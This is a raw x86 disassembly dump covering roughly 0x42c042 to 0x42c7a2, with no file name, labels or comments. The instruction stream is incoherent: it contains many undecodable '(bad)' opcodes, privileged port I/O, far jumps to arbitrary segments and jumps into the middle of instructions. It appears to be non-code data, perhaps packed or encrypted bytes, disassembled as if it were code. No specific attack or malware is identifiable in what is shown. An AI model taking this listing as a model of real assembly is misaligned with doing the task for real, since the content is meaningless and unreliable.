  42c042:	adc    al,0xc5
  42c044:	mov    eax,0xf3891f10
  42c049:	sbb    BYTE PTR [ecx],bl
  42c04b:	add    ebx,DWORD PTR [edx+0x6b]
  42c04e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c04f:	aad    0x44
  42c051:	dec    edx
  42c052:	mov    esp,0x70534095
  42c057:	jmp    0xb6ba69e4
  42c05c:	mov    bh,0x6b
  42c05e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c05f:	mov    cl,BYTE PTR [esi]
  42c061:	add    cl,BYTE PTR [esi+0x386a8d1b]
  42c067:	mov    ds:0xf31e25ef,eax
  42c06c:	push   edx
  42c06d:	loopne 0x42c0c4
  42c06f:	adc    esi,esi
  42c071:	int3   
  42c072:	mov    dl,ch
  42c074:	dec    ebp
  42c075:	test   BYTE PTR [edi+0x27],0xf2
  42c079:	pop    ebp
  42c07a:	lock out 0x8a,al
  42c07d:	popa   
  42c07e:	test   BYTE PTR [ebp+ebp*8-0x78],dh
  42c082:	fcmovbe st,st(6)
  42c084:	jno    0x42c06b
  42c086:	mov    ds:0xfa60d459,al
  42c08b:	jl     0x42c102
  42c08d:	add    dl,ah
  42c08f:	int    0x9b
  42c091:	out    0xe7,eax
  42c093:	sub    dh,ah
  42c095:	add    eax,0xb995b14
  42c09a:	and    DWORD PTR [ebp+0x35d0b146],eax
  42c0a0:	outs   dx,BYTE PTR ds:[esi]
  42c0a1:	adc    al,0xea
  42c0a3:	push   ebx
  42c0a4:	xchg   esp,ecx
  42c0a6:	add    bl,al
  42c0a8:	mov    ah,0xd1
  42c0aa:	ds aam 0xd
  42c0ad:	pop    edx
  42c0ae:	and    esi,ecx
  42c0b0:	and    al,0xd1
  42c0b2:	sub    DWORD PTR [edi+0x7bc25989],ebx
  42c0b8:	addr16 fneni(8087 only) 
  42c0bb:	push   ds
  42c0bc:	pop    esp
  42c0bd:	repz mov ch,0xd5
  42c0c0:	out    0x27,eax
  42c0c2:	ins    BYTE PTR es:[edi],dx
  42c0c3:	fucomip st,st(2)
  42c0c5:	lds    ebp,FWORD PTR [esi+0x1e187f45]
  42c0cb:	or     eax,0x1e6ecaa5
  42c0d0:	jbe    0x42c114
  42c0d2:	das    
  42c0d3:	mov    eax,ds:0x89185100
  42c0d8:	xchg   esi,eax
  42c0d9:	and    DWORD PTR [esi+0x4f158c3b],0x1e522cf8
  42c0e3:	or     eax,0x5e99f463
  42c0e8:	jmp    0x96b0b0eb
  42c0ed:	or     ebx,edi
  42c0ef:	shl    ch,cl
  42c0f1:	popf   
  42c0f2:	cs mov dh,ah
  42c0f5:	sahf   
  42c0f6:	bound  eax,QWORD PTR [edi-0x77405052]
  42c0fc:	dec    eax
  42c0fd:	mov    ah,0x0
  42c0ff:	sar    BYTE PTR [ebp-0x69d1d5fe],cl
  42c105:	mov    al,0x6f
  42c107:	push   cs
  42c108:	jecxz  0x42c147
  42c10a:	pop    ds
  42c10b:	fwait
  42c10c:	(bad)  
  42c10d:	or     ebp,DWORD PTR [edi-0x5dd8c3de]
  42c113:	shl    DWORD PTR [ebx+0x7cdb88ca],cl
  42c119:	push   eax
  42c11a:	into   
  42c11b:	and    bl,BYTE PTR [edi-0x4904e071]
  42c121:	repz mov dh,0xac
  42c124:	mov    eax,0x59ab7757
  42c129:	arpl   sp,di
  42c12b:	sbb    edx,esp
  42c12d:	test   DWORD PTR ds:0x80d4fff8,eax
  42c133:	mov    cl,BYTE PTR [eax-0x3aa7ae75]
  42c139:	pop    ss
  42c13a:	or     edx,DWORD PTR [esi+0x13]
  42c13d:	adc    eax,0xdb8fa5c
  42c142:	mov    bl,0xf5
  42c144:	inc    ecx
  42c145:	shr    esi,1
  42c147:	in     al,dx
  42c148:	mov    bl,0xd7
  42c14a:	dec    edi
  42c14b:	and    cl,BYTE PTR [eax]
  42c14d:	xchg   esi,eax
  42c14e:	cdq    
  42c14f:	xchg   ebx,eax
  42c150:	loop   0x42c159
  42c152:	sbb    ah,dl
  42c154:	jne    0x42c129
  42c156:	inc    edi
  42c157:	and    al,0x8e
  42c159:	cmp    DWORD PTR [ebx-0x20],0xffffff94
  42c15d:	das    
  42c15e:	jb     0x42c1d8
  42c160:	mov    ecx,0xc2bfe785
  42c165:	mov    dl,0x1e
  42c167:	xlat   BYTE PTR ds:[ebx]
  42c168:	pop    ecx
  42c169:	sbb    dh,BYTE PTR [ecx]
  42c16b:	loop   0x42c10d
  42c16d:	jecxz  0x42c146
  42c16f:	ins    BYTE PTR es:[edi],dx
  42c170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c171:	adc    eax,0x1508f177
  42c176:	iret   
  42c177:	ror    DWORD PTR [edx+0x41ab6a21],cl
  42c17d:	add    edx,DWORD PTR [esi-0x5]
  42c180:	fadd   DWORD PTR [eax]
  42c182:	pop    ds
  42c183:	out    dx,al
  42c184:	mov    DWORD PTR [ecx],edi
  42c186:	les    edi,FWORD PTR [ecx+0x3da0efa6]
  42c18c:	jmp    0x42c193
  42c18e:	aam    0x48
  42c190:	scas   eax,DWORD PTR es:[edi]
  42c191:	xchg   ebp,eax
  42c192:	sbb    cl,BYTE PTR [edx]
  42c194:	ins    DWORD PTR es:[edi],dx
  42c195:	call   0xc719:0x5aac79b
  42c19c:	mov    ebp,0x24290eb0
  42c1a1:	add    edx,ebp
  42c1a3:	xchg   BYTE PTR [bx+di],ch
  42c1a6:	(bad)  
  42c1a7:	pop    esi
  42c1a8:	pop    esp
  42c1a9:	nop
  42c1aa:	fdiv   QWORD PTR ds:0xff1f8e1e
  42c1b0:	sbb    eax,0xc98843ea
  42c1b5:	mov    ds:0xfd381c1d,al
  42c1ba:	jl     0x42c1ef
  42c1bc:	pop    eax
  42c1bd:	inc    edi
  42c1be:	fistp  WORD PTR [edx-0x45]
  42c1c1:	xor    al,BYTE PTR [edx]
  42c1c3:	xor    ah,BYTE PTR [ebx-0x48]
  42c1c6:	bound  ecx,QWORD PTR [ecx]
  42c1c8:	lds    ebx,FWORD PTR es:[ebp-0x4a]
  42c1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1cd:	dec    ecx
  42c1ce:	pop    esi
  42c1cf:	jns    0x42c1b1
  42c1d1:	add    dh,BYTE PTR [edx-0x56]
  42c1d4:	cmp    bh,al
  42c1d6:	imul   ebp,DWORD PTR [ecx+ecx*8-0x483ce00d],0x77
  42c1de:	cmp    bl,BYTE PTR [edi+0x10]
  42c1e1:	xor    ebx,DWORD PTR [eax-0x25cfc22c]
  42c1e7:	jp     0x42c191
  42c1e9:	ret    0xac31
  42c1ec:	mov    DWORD PTR [edi-0x57879017],eax
  42c1f2:	daa    
  42c1f3:	cld    
  42c1f4:	inc    esi
  42c1f5:	clc    
  42c1f6:	arpl   WORD PTR [ebx+0x52cca548],bp
  42c1fc:	xor    ecx,edi
  42c1fe:	jecxz  0x42c1d5
  42c200:	and    WORD PTR [eax+0x2],sp
  42c204:	mov    BYTE PTR ds:0xfa6ee95a,ah
  42c20a:	scas   eax,DWORD PTR es:[edi]
  42c20b:	adc    al,0x5e
  42c20d:	add    esp,DWORD PTR [esi-0x6375706a]
  42c213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c214:	sub    DWORD PTR [esi],eax
  42c216:	pop    ds
  42c217:	mov    ebx,0x1a1e6b4f
  42c21c:	jae    0x42c238
  42c21e:	dec    ebx
  42c21f:	sar    DWORD PTR [ecx+0x45],0x48
  42c223:	lea    edx,[edi]
  42c225:	sub    DWORD PTR [eax-0x37],0xffffff86
  42c229:	mov    bh,ah
  42c22b:	(bad)  [eax-0x7d8395ad]
  42c231:	push   cs
  42c232:	cmp    al,0x73
  42c234:	lods   eax,DWORD PTR ds:[esi]
  42c235:	add    eax,0xe133f4b4
  42c23a:	or     al,0xe9
  42c23c:	pop    esi
  42c23e:	pop    ds
  42c23f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c240:	leave  
  42c241:	adc    al,0xf5
  42c243:	or     DWORD PTR [edx-0x3a2bb6fa],edx
  42c249:	arpl   WORD PTR ss:[ebx-0x79457b39],bx
  42c250:	mov    DWORD PTR ds:0xe1ab9e00,ecx
  42c256:	jg     0x42c227
  42c258:	mov    DWORD PTR [edx],eax
  42c25a:	(bad)  
  42c25b:	ds js  0x42c232
  42c25e:	sti    
  42c25f:	xor    eax,0xc71f15c6
  42c264:	jno    0x42c265
  42c266:	jmp    0xa0d4:0x297b4c36
  42c26d:	or     DWORD PTR [eax-0x426ac002],esi
  42c273:	sti    
  42c274:	mov    BYTE PTR [ecx+0x69b83b6e],ch
  42c27a:	and    ch,bh
  42c27c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c27d:	dec    edx
  42c27e:	pop    esp
  42c27f:	inc    ecx
  42c280:	push   esp
  42c281:	mov    edi,0xf831d467
  42c286:	and    BYTE PTR [edi],al
  42c288:	mov    si,0xe762
  42c28c:	pop    ebx
  42c28d:	loopne 0x42c307
  42c28f:	mov    al,0x1e
  42c291:	in     al,0xc0
  42c293:	pop    esp
  42c294:	or     eax,0x99051203
  42c299:	xor    bl,BYTE PTR [edi+0x1f2c6116]
  42c29f:	mov    eax,esp
  42c2a1:	in     al,dx
  42c2a2:	push   edi
  42c2a3:	sti    
  42c2a4:	adc    BYTE PTR ds:0x8d5ad720,bl
  42c2aa:	hlt    
  42c2ab:	sbb    eax,0x44020a34
  42c2b0:	mov    ecx,ebx
  42c2b2:	xor    BYTE PTR [edx],bl
  42c2b4:	mov    al,ds:0x3d93b6b5
  42c2b9:	add    bh,BYTE PTR [ecx+ebx*2-0x7e95fbba]
  42c2c0:	out    0xeb,eax
  42c2c2:	mov    edi,0xa4e98fa6
  42c2c7:	mov    ecx,0xb4dc45a5
  42c2cc:	call   0x4110385a
  42c2d1:	sbb    BYTE PTR [esi],cl
  42c2d3:	inc    ecx
  42c2d4:	adc    eax,0x34d54712
  42c2d9:	ror    DWORD PTR [eax+0x1e],0x89
  42c2dd:	sti    
  42c2de:	cmp    al,0x42
  42c2e0:	lods   eax,DWORD PTR ds:[esi]
  42c2e1:	int    0x8d
  42c2e3:	loope  0x42c2a3
  42c2e5:	pop    ss
  42c2e6:	stos   BYTE PTR es:[edi],al
  42c2e7:	pop    esi
  42c2e8:	add    DWORD PTR [bx+si],ebx
  42c2eb:	xor    al,0x82
  42c2ed:	outs   dx,DWORD PTR ds:[esi]
  42c2ee:	jno    0x42c2d8
  42c2f0:	repz cmp esp,eax
  42c2f3:	shr    DWORD PTR [eax+0x12dd71aa],cl
  42c2f9:	or     dh,0x7a
  42c2fc:	jbe    0x42c306
  42c2fe:	sub    esi,esp
  42c300:	dec    esi
  42c301:	adc    al,0xdc
  42c303:	inc    ebp
  42c304:	ins    BYTE PTR es:[edi],dx
  42c305:	popf   
  42c306:	iret   
  42c307:	push   esp
  42c308:	push   ss
  42c309:	imul   esi,DWORD PTR [esi+edi*8+0x211e1941],0x65
  42c311:	rol    DWORD PTR [eax-0x6b],1
  42c314:	mov    WORD PTR [ebp-0x52bc2ba3],ds
  42c31a:	add    DWORD PTR [ebx],ebp
  42c31c:	cmp    DWORD PTR [edx+0x4c],0x7e8f88c0
  42c323:	in     al,dx
  42c324:	rol    DWORD PTR [ecx+0x29e9c19],0x3e
  42c32b:	lahf   
  42c32c:	dec    edx
  42c32d:	sar    DWORD PTR [ecx-0x3d],1
  42c330:	sub    esp,ecx
  42c332:	pop    ds
  42c333:	sar    DWORD PTR [eax],cl
  42c335:	jmp    0xd41c:0x1b185163
  42c33c:	pop    esi
  42c33d:	mov    edi,0xc09baa9c
  42c342:	imul   esp,DWORD PTR [eax-0x774f8878],0xffffffb0
  42c349:	test   eax,0x727ef1a3
  42c34e:	(bad)  
  42c34f:	aam    0x8a
  42c351:	dec    edi
  42c352:	xchg   esp,eax
  42c353:	xor    al,0x3a
  42c355:	ja     0x42c311
  42c357:	mov    ecx,0x8cdd788
  42c35c:	scas   al,BYTE PTR es:[edi]
  42c35d:	jl     0x42c393
  42c35f:	dec    ebx
  42c360:	inc    ebp
  42c361:	lock xor DWORD PTR [ecx+0x4c],ebx
  42c365:	inc    DWORD PTR [edx+edi*4-0x17]
  42c369:	push   ecx
  42c36a:	pop    ds
  42c36b:	xchg   edi,eax
  42c36c:	jg     0x42c333
  42c36e:	xchg   BYTE PTR [eax+eiz*2+0x73],cl
  42c372:	add    DWORD PTR [ebx+esi*8+0x2],esi
  42c376:	mov    eax,0x30e9aaf4
  42c37b:	xor    ah,ah
  42c37d:	sti    
  42c37e:	pop    ds
  42c37f:	cmp    eax,0x144d57c5
  42c384:	pusha  
  42c385:	cs dec ecx
  42c387:	enter  0x4a67,0xf4
  42c38b:	mov    ah,0x51
  42c38d:	inc    ebp
  42c38e:	jno    0x42c364
  42c390:	add    al,0x59
  42c392:	dec    edi
  42c393:	jge    0x42c3b7
  42c395:	sbb    edi,DWORD PTR [edx]
  42c397:	inc    ebx
  42c398:	mov    bh,0x95
  42c39a:	out    0x48,eax
  42c39c:	mov    ebp,eax
  42c39e:	pop    ebp
  42c39f:	fs mov dl,0x64
  42c3a2:	int    0xd4
  42c3a4:	or     edx,edi
  42c3a6:	(bad)  
  42c3a8:	jnp    0x42c3c4
  42c3aa:	adc    eax,DWORD PTR [ebx+0x6d]
  42c3ad:	ret    
  42c3ae:	pusha  
  42c3af:	outs   dx,DWORD PTR ds:[esi]
  42c3b0:	pop    ds
  42c3b1:	mov    ch,0xb1
  42c3b3:	not    dh
  42c3b5:	lock mov eax,0xa1ae04ab
  42c3bb:	sub    DWORD PTR [ebp+eiz*1+0x17c7f1c3],0x30f5011e
  42c3c6:	cmp    eax,0x61b07678
  42c3cb:	aam    0xc8
  42c3cd:	add    BYTE PTR [edx-0x13],ah
  42c3d0:	outs   dx,BYTE PTR ds:[esi]
  42c3d1:	lea    ebp,[ebx+0x1b]
  42c3d4:	mov    DWORD PTR [ebp-0x7b],edi
  42c3d7:	xor    esi,DWORD PTR [ecx]
  42c3d9:	jmp    0x358e223
  42c3de:	lock pop eax
  42c3e0:	lods   al,BYTE PTR ds:[esi]
  42c3e1:	xor    eax,0x6cddf61c
  42c3e6:	push   ds
  42c3e7:	dec    edi
  42c3e8:	xchg   edx,eax
  42c3e9:	iret   
  42c3ea:	mov    WORD PTR [edx+0x2a],es
  42c3ed:	sub    al,0x76
  42c3ef:	aam    0x8
  42c3f1:	xor    eax,0xc339e412
  42c3f6:	pop    ss
  42c3f7:	fisttp WORD PTR [ecx+0xbf2865b]
  42c3fd:	stos   BYTE PTR es:[edi],al
  42c3fe:	in     eax,0x9a
  42c400:	daa    
  42c401:	sbb    eax,0x8f41b1a0
  42c406:	retf   0x8af0
  42c409:	hlt    
  42c40a:	pop    eax
  42c40b:	add    eax,0x4160f6f9
  42c410:	(bad)  
  42c411:	loop   0x42c456
  42c413:	add    DWORD PTR [eax-0x34],edi
  42c416:	xlat   BYTE PTR ss:[ebx]
  42c418:	popa   
  42c419:	shl    DWORD PTR [eax],0x8
  42c41c:	les    ebx,FWORD PTR [ebp+0x3980bd53]
  42c422:	fs popf 
  42c424:	leave  
  42c425:	jmp    0x42c409
  42c427:	data16 jns 0x42c48d
  42c42a:	push   ss
  42c42b:	jne    0x42c3f8
  42c42d:	and    eax,0x5ea6d4a7
  42c432:	push   ecx
  42c433:	stos   BYTE PTR es:[edi],al
  42c434:	or     eax,ecx
  42c436:	xor    DWORD PTR [ecx+0x49d36268],edx
  42c43c:	loopne 0x42c3d6
  42c43e:	pop    ss
  42c43f:	stos   DWORD PTR es:[edi],eax
  42c440:	mov    edi,esi
  42c442:	xor    bh,BYTE PTR ss:[edx-0x70]
  42c446:	and    BYTE PTR [esi],bl
  42c448:	js     0x42c44c
  42c44a:	dec    edx
  42c44b:	(bad)  
  42c44d:	out    0x2b,eax
  42c44f:	pop    esi
  42c450:	xor    DWORD PTR [esi],edx
  42c452:	push   ds
  42c453:	test   DWORD PTR [ecx-0x722ec46c],esi
  42c459:	cwde   
  42c45a:	pop    esp
  42c45b:	ins    DWORD PTR es:[edi],dx
  42c45c:	mov    dh,0x9a
  42c45e:	mov    eax,ds:0x32314d4
  42c463:	push   edi
  42c464:	test   DWORD PTR [ecx+0x7c],ebp
  42c467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c468:	jne    0x42c4c2
  42c46a:	loop   0x42c3f5
  42c46c:	push   eax
  42c46d:	(bad)  
  42c46e:	bound  eax,QWORD PTR [ebx+0x32c77c4]
  42c474:	inc    edx
  42c475:	sar    BYTE PTR [ecx+0x60d1f315],0x41
  42c47c:	ja     0x42c4e4
  42c47e:	add    ah,0xdc
  42c481:	dec    esi
  42c482:	je     0x42c458
  42c484:	sub    cl,BYTE PTR [ebx+0x21]
  42c487:	rcr    DWORD PTR [edi],cl
  42c489:	mov    esi,0x11890208
  42c48e:	int    0x7
  42c490:	fwait
  42c491:	xlat   BYTE PTR ds:[ebx]
  42c492:	xor    ebp,DWORD PTR [ebp-0x71]
  42c495:	add    eax,0x6df7306c
  42c49a:	pop    eax
  42c49b:	sbb    eax,DWORD PTR [esi]
  42c49d:	sahf   
  42c49e:	pop    ds
  42c49f:	das    
  42c4a0:	or     DWORD PTR [edi],ebp
  42c4a2:	adc    DWORD PTR [ecx-0x2b04d62c],edi
  42c4a8:	push   ss
  42c4a9:	xchg   ebx,eax
  42c4aa:	xchg   ebx,eax
  42c4ab:	stc    
  42c4ac:	ins    BYTE PTR es:[edi],dx
  42c4ad:	out    0x21,eax
  42c4af:	push   ss
  42c4b0:	mov    ecx,eax
  42c4b2:	sub    ebx,ecx
  42c4b4:	outs   dx,DWORD PTR ds:[esi]
  42c4b5:	mov    eax,0xca35070f
  42c4ba:	lods   eax,DWORD PTR ds:[esi]
  42c4bb:	ds (bad) 
  42c4bd:	(bad)  
  42c4be:	nop
  42c4bf:	push   edi
  42c4c0:	aam    0xa7
  42c4c2:	aas    
  42c4c3:	std    
  42c4c4:	pop    ds
  42c4c5:	arpl   WORD PTR [esi],bx
  42c4c7:	std    
  42c4c8:	jno    0x42c4ee
  42c4ca:	sub    al,0x17
  42c4cc:	jge    0x42c4c7
  42c4ce:	sbb    ah,BYTE PTR [ebx+edx*8]
  42c4d1:	mov    BYTE PTR [eax+0x4f],ah
  42c4d4:	loope  0x42c531
  42c4d6:	out    dx,al
  42c4d7:	jle    0x42c481
  42c4d9:	xor    al,0x64
  42c4db:	cmc    
  42c4dc:	rcr    BYTE PTR [ebx],1
  42c4de:	(bad)
  42c4e1:	mov    ds:0x24bce2e2,eax
  42c4e6:	and    BYTE PTR [esi],ah
  42c4e8:	mov    bh,0x27
  42c4ea:	mov    eax,ds:0x34be815f
  42c4ef:	adc    al,0xad
  42c4f1:	retf   
  42c4f2:	and    dl,bh
  42c4f4:	and    bh,dh
  42c4f6:	push   eax
  42c4f7:	xor    bl,BYTE PTR [ecx]
  42c4f9:	daa    
  42c4fa:	shl    BYTE PTR [edx+0x29f91db],0xd4
  42c501:	sbb    eax,0xb5b1f4bf
  42c506:	or     edi,eax
  42c508:	mov    bl,cl
  42c50a:	enter  0xd858,0x83
  42c50e:	lods   al,BYTE PTR ds:[esi]
  42c50f:	aad    0x79
  42c511:	ficom  DWORD PTR [edx+0x4e6a71a6]
  42c517:	push   eax
  42c518:	mov    DWORD PTR [edi],ecx
  42c51a:	ins    BYTE PTR es:[edi],dx
  42c51b:	add    ebp,ecx
  42c51d:	or     BYTE PTR [edx+0x458b9712],0xf0
  42c524:	mov    DWORD PTR [ecx-0x64],edi
  42c527:	inc    ebx
  42c528:	dec    ecx
  42c529:	jne    0x42c527
  42c52b:	jno    0x42c4b6
  42c52d:	or     DWORD PTR [eax],edx
  42c52f:	xchg   BYTE PTR [ebp-0x3d],cl
  42c532:	jg     0x42c4b6
  42c534:	jb     0x42c539
  42c536:	and    dl,dl
  42c538:	mov    al,ds:0xde7a9915
  42c53d:	(bad)  
  42c53e:	cmp    eax,DWORD PTR [ebx-0x45640405]
  42c544:	dec    edx
  42c545:	pusha  
  42c546:	sub    eax,0xc4c08ff8
  42c54b:	sub    esp,ebp
  42c54d:	sbb    edi,edi
  42c54f:	in     al,0x3e
  42c551:	xchg   BYTE PTR es:[esi+0x1a],bh
  42c555:	jge    0x42c52f
  42c557:	mov    ecx,0xa15e44e5
  42c55c:	idiv   DWORD PTR [ebx+0x5588c21d]
  42c562:	push   eax
  42c563:	out    dx,al
  42c564:	add    BYTE PTR [esi-0x22],bl
  42c567:	ja     0x42c503
  42c569:	add    eax,0x322e86f2
  42c56e:	add    eax,0x1f992274
  42c573:	jno    0x42c5a5
  42c575:	daa    
  42c576:	aaa    
  42c577:	popf   
  42c578:	adc    edx,DWORD PTR fs:[ebx]
  42c57b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c57c:	bound  edi,QWORD PTR [edx+ebp*8+0x6b]
  42c580:	mov    DWORD PTR [ebp+0x25],esp
  42c583:	xlat   BYTE PTR ds:[ebx]
  42c584:	cwde   
  42c585:	punpcklwd mm3,mm7
  42c588:	pop    edx
  42c589:	push   cs
  42c58a:	xchg   BYTE PTR [esi+0x2c],cl
  42c58d:	sbb    ecx,esi
  42c58f:	adc    cl,bh
  42c591:	add    bl,BYTE PTR [edx+0x39cf71ce]
  42c597:	rol    DWORD PTR [ecx+0x2ebd6752],cl
  42c59d:	xchg   esp,eax
  42c59e:	jae    0x42c52f
  42c5a0:	mov    BYTE PTR [eax],al
  42c5a2:	mov    DWORD PTR [ecx],eax
  42c5a4:	pop    DWORD PTR ds:0xe2d08e88
  42c5aa:	jb     0x42c5bc
  42c5ac:	dec    ebx
  42c5ad:	xchg   ecx,eax
  42c5ae:	pusha  
  42c5af:	out    dx,eax
  42c5b0:	push   esp
  42c5b1:	call   0xd564:0x42ee3ab0
  42c5b8:	out    dx,al
  42c5b9:	arpl   di,di
  42c5bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5bc:	jae    0x42c5aa
  42c5be:	pop    eax
  42c5bf:	xchg   esi,eax
  42c5c0:	mov    DWORD PTR ds:0x20796cf6,ebp
  42c5c6:	dec    ecx
  42c5c7:	repz aad 0x2
  42c5ca:	into   
  42c5cb:	cld    
  42c5cc:	inc    edx
  42c5cd:	push   edx
  42c5ce:	sahf   
  42c5cf:	lahf   
  42c5d0:	(bad)  
  42c5d1:	pop    eax
  42c5d2:	jnp    0x42c5e5
  42c5d4:	shl    bl,cl
  42c5d6:	in     al,0x6b
  42c5d8:	shl    DWORD PTR [edi+ebx*8+0x11752e71],cl
  42c5df:	xlat   BYTE PTR ds:[ebx]
  42c5e0:	retf   0x8fca
  42c5e3:	and    al,0xb0
  42c5e5:	mov    bh,0x16
  42c5e7:	aad    0x89
  42c5e9:	lahf   
  42c5ea:	pop    eax
  42c5eb:	push   ds
  42c5ec:	sbb    edx,edi
  42c5ee:	add    BYTE PTR [eax-0x170f7d3b],ch
  42c5f4:	scas   al,BYTE PTR es:[edi]
  42c5f5:	int    0x51
  42c5f7:	xchg   esi,eax
  42c5f8:	gs pop edx
  42c5fa:	pop    ds
  42c5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5fc:	push   ss
  42c5fd:	stc    
  42c5fe:	and    al,0x50
  42c600:	test   BYTE PTR ds:0xc3b6d5a7,cl
  42c606:	ror    BYTE PTR [ebx-0x23ea7ef],cl
  42c60c:	mov    cl,0xf5
  42c60e:	mov    al,ds:0x77860950
  42c613:	dec    ecx
  42c614:	and    BYTE PTR [edx],cl
  42c616:	fst    st(4)
  42c618:	int3   
  42c619:	cld    
  42c61a:	cld    
  42c61b:	dec    edi
  42c61c:	les    ecx,FWORD PTR [esp+ebx*1+0x6]
  42c620:	mov    DWORD PTR [ebp+0x9b0100d],edx
  42c626:	cmp    ebp,DWORD PTR [esi]
  42c628:	and    eax,DWORD PTR [ebx]
  42c62a:	(bad)  
  42c62b:	call   0x4d01:0xf46264a8
  42c632:	xchg   ebx,eax
  42c633:	sub    DWORD PTR [edi+0x42cc9e00],esp
  42c639:	stos   BYTE PTR es:[edi],al
  42c63a:	push   cs
  42c63b:	data16 adc cl,cl
  42c63e:	dec    ebp
  42c63f:	aad    0x96
  42c641:	cmp    BYTE PTR [edx-0x77],al
  42c644:	and    BYTE PTR [edi],ah
  42c646:	repz rcl BYTE PTR [edi+0xc62e9bd],1
  42c64d:	xchg   ebp,eax
  42c64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c64f:	and    cl,al
  42c651:	ds add eax,0xd01015d5
  42c657:	adc    BYTE PTR [esi+edx*1+0x1f],bl
  42c65b:	and    al,0x7b
  42c65d:	int    0x89
  42c65f:	fisttp DWORD PTR [ecx+0x73b783eb]
  42c665:	(bad)  [ecx-0x38]
  42c669:	(bad)  
  42c66b:	aam    0xa5
  42c66d:	mov    dh,0xf1
  42c66f:	xchg   esi,eax
  42c670:	cmp    eax,0xa004f4a9
  42c675:	leave  
  42c676:	mov    edx,0x341d6081
  42c67b:	or     eax,0x640c4c1e
  42c680:	mov    dl,0x3e
  42c682:	xor    dl,ah
  42c684:	lock xlat BYTE PTR ds:[ebx]
  42c686:	shl    cl,0x81
  42c689:	sti    
  42c68a:	inc    ebp
  42c68b:	mov    edx,0x9d9e0b88
  42c690:	sbb    al,0x87
  42c692:	mov    ecx,0xa0288d3
  42c697:	outs   dx,BYTE PTR ds:[esi]
  42c698:	retf   0xf513
  42c69b:	mov    WORD PTR [esi+0x6ba560c2],cs
  42c6a1:	inc    edi
  42c6a2:	cs mov ecx,0xd47745f6
  42c6a8:	enter  0x97c3,0xd2
  42c6ac:	scas   eax,DWORD PTR es:[edi]
  42c6ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6ae:	push   0x5b4b8835
  42c6b3:	out    dx,al
  42c6b4:	push   0x8d296e2f
  42c6b9:	adc    al,0x76
  42c6bb:	ins    BYTE PTR es:[edi],dx
  42c6bc:	sbb    DWORD PTR [ebp-0x634fcdea],edx
  42c6c2:	nop
  42c6c3:	fisubr WORD PTR [ebp+0x38]
  42c6c6:	push   ds
  42c6c7:	add    ebx,edi
  42c6c9:	mov    ?,WORD PTR [ecx+0x2c]
  42c6cc:	pop    eax
  42c6cd:	cmp    eax,0x4cdb9524
  42c6d2:	and    DWORD PTR [edx],ebx
  42c6d4:	lahf   
  42c6d5:	add    dh,BYTE PTR [eax+0x7]
  42c6d8:	gs xchg ecx,eax
  42c6da:	inc    esp
  42c6db:	xor    ecx,DWORD PTR [eax+0x6e7a3687]
  42c6e1:	mov    dh,0xb2
  42c6e3:	ss push edi
  42c6e5:	add    esi,edx
  42c6e7:	(bad)  
  42c6e8:	mov    bl,0x9a
  42c6ea:	cwde   
  42c6eb:	add    ebp,DWORD PTR [esi+edi*4+0xc3aab1f]
  42c6f2:	dec    edi
  42c6f3:	or     esi,DWORD PTR [eax]
  42c6f5:	jg     0x42c6af
  42c6f7:	lods   eax,DWORD PTR ds:[esi]
  42c6f8:	and    eax,0xd0974cdb
  42c6fd:	sub    BYTE PTR [esi],0x4b
  42c700:	repnz inc esi
  42c702:	add    eax,0x955389f8
  42c707:	add    BYTE PTR [ebx],0xfb
  42c70a:	call   0xe47b:0xb4025eaf
  42c711:	rcr    DWORD PTR [esi-0x42],0x81
  42c715:	stos   BYTE PTR es:[edi],al
  42c716:	outs   dx,BYTE PTR ds:[esi]
  42c717:	inc    ecx
  42c718:	mov    edi,0xc62c2d50
  42c71d:	mov    WORD PTR [edi-0x476e753b],?
  42c723:	aam    0xc0
  42c725:	xlat   BYTE PTR ds:[ebx]
  42c726:	rcl    BYTE PTR [esi-0x52ee516d],0x89
  42c72d:	mov    ecx,DWORD PTR [ebx]
  42c72f:	add    bh,ch
  42c731:	stos   BYTE PTR es:[edi],al
  42c732:	pop    edi
  42c733:	cmp    ecx,DWORD PTR [esi]
  42c735:	add    esp,DWORD PTR [esi]
  42c737:	loope  0x42c758
  42c739:	scas   eax,DWORD PTR es:[edi]
  42c73a:	push   eax
  42c73b:	pop    esp
  42c73c:	xchg   ebp,eax
  42c73d:	std    
  42c73e:	data16 jecxz 0x42c739
  42c741:	pop    ebx
  42c742:	mov    esi,ebp
  42c744:	jecxz  0x42c6db
  42c746:	push   es
  42c747:	lea    ebp,[eax-0x57487ff1]
  42c74d:	add    cl,BYTE PTR [eax]
  42c74f:	iret   
  42c750:	cmp    al,0x75
  42c752:	jmp    0x6104a89c
  42c757:	out    0xfd,eax
  42c759:	or     ebp,DWORD PTR [edi+ebx*8-0x3e]
  42c75d:	inc    ebp
  42c75e:	stc    
  42c75f:	aad    0x46
  42c761:	popf   
  42c762:	dec    esp
  42c763:	fs cmp dh,bl
  42c766:	sti    
  42c767:	popf   
  42c768:	mov    DWORD PTR [edi-0x32],esp
  42c76b:	sahf   
  42c76c:	or     DWORD PTR [ebx-0x26],0x1f
  42c770:	call   0xfd179b68
  42c775:	out    0x4f,al
  42c777:	lock clc 
  42c779:	push   ebx
  42c77a:	ins    BYTE PTR es:[edi],dx
  42c77b:	and    ecx,DWORD PTR [ecx-0x4c11b56d]
  42c781:	mov    ebx,DWORD PTR ds:0x802e6dd
  42c787:	mov    ah,0x78
  42c789:	and    edx,esi
  42c78b:	dec    edi
  42c78c:	jmp    0x91e1:0x67751fd9
  42c793:	ins    BYTE PTR es:[edi],dx
  42c794:	sub    al,0xa5
  42c796:	int3   
  42c797:	aam    0x90
  42c799:	jmp    0xc6c2b72
  42c79e:	and    bh,dh
  42c7a0:	sti    
  42c7a1:	stos   DWORD PTR es:[edi],eax
  42c7a2:	inc    edi
